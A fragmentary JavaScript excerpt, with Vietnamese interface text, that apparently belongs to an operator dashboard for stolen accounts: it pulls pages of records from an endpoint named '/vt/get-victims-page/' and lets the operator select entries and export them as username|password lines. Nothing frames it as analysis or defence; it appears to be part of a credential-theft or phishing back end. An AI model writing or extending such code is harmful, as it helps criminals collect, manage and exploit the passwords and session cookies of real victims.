    ...
    document.getElementById("btn-download-select").onclick=function(){
        ...
        if(listCookies.length>0){
            if(confirm("Xác nhận tải những mục đã chọn?")){
                ...
                var saveCookies = "";
                indexDelete.forEach(element=>{
                    saveCookies+=document.getElementById(`txt-username${element}`).innerText+"|"+document.getElementById(`txt-password${element}`).innerText+"\n";
                });
...
async function getListCookie(){
    try {
        const res = await getResp("/vt/get-victims-page/"+indexPage);
        if(res !=null){
            setListCookies(res);
        } 
        else{
